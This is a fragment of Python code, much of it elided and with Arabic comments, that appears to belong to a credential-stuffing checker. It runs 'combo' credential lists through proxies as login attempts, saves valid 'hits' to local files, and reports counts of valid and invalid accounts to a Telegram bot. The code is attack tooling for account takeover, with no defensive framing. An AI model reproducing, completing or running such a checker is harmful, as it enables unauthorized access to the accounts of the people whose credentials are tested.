...
def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
    ...
    return counters  # إرجاع العدادات

def send_summary_to_telegram(combo_file, counters):
    message = f"""
File Processed: {combo_file}
Total Valid Accounts: {counters['valid']}
Total Invalid Accounts: {counters['invalid']}
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            print(f"Failed to send summary to Telegram. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while sending summary to Telegram: {e}")
    ...
    for combo_file in combo_files:
        ...
        with open("masa_hits.txt", "a", encoding="utf-8") as local_hits_file:
            with open("temp_hits.txt", "w", encoding="utf-8") as temp_file:
                ...
                counters = process_combo_file(temp_file, local_hits_file, proxies, combo_file)
                print("Login attempts finished.")
                send_summary_to_telegram(combo_file, counters)  # إرسال ملخص الفحص
